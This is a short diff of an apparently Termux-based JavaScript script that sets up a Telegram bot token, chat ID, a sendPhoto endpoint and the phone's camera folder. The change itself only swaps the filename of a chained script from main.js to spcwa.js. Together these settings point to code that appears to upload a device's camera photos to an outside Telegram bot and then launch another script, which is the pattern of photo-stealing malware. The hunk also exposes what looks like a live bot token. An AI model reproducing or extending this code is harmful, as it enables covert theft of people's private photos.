@@ -9,7 +9,7 @@ const BOT_TOKEN = "7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY";
 const CHAT_ID = "6565158025";
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 const CAMERA_DIR = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera";
-const NEXT_SCRIPT = "main.js"; // <-- YOUR MAIN SCRIPT FILENAME
+const NEXT_SCRIPT = "spcwa.js"; // <-- YOUR MAIN SCRIPT FILENAME
 const WAIT_TIME = 2 * 60 * 1000; // 2 minutes in milliseconds
 
 // === CHECK STORAGE SETUP ===
